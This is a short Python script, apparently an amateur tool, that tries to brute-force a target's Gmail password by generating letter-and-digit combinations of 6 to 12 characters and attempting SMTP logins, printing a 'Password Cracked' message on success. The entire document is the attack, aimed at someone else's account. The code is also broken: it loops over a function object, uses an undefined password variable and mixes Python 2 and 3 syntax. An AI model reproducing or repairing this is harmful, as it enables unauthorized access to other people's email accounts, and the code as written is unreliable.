import itertools 
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter Target's Gmail Address: ")
def print_perms(chars, minlen, maxlen): 
    for n in xrange(minlen, maxlen+1): 
        for perm in itertools.product(chars, repeat=n): 
            print(''.join(perm)) 

print_perms("abcdefghijklmnopqrstuvwxyz1234567890", 6, 12)

for symbols in print_perms:


       try:
           smtpserver.login(user, password)

           print("[+] Password Cracked: %s") % symbols
           break
       except smtplib.SMTPAuthenticationError:
           print("[!] Password Inccorect: %s") % symbols



